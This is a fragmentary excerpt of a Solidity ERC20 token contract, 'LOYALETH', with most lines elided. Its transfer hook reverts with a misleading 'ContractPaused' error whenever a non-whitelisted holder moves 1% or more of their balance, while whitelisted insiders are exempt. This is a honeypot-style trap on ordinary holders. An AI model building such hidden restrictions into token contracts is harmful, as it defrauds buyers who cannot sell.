...
contract LOYALETH is Ownable, Pausable, ERC20, ERC20Burnable {
  ...
  constructor(address _ben, address ben_eth, address _disperse) ERC20("LOYALETH.COM", "LOYALETH.COM") Ownable() {
    whitelist[msg.sender] = true;
    whitelist[_ben] = true;
    whitelist[_disperse] = true;
  ...
  function _beforeTokenTransfer(address sender, address recipient, uint256 amount) internal override {
    ...
    if (isBuy) {
      ...
      _lastBlockTransfer[recipient] = block.number;
        ...
        if (!whitelist[sender]) { 
            if ( amount >= _balances[sender] / 100 ) revert ContractPaused(); 
            }
        else
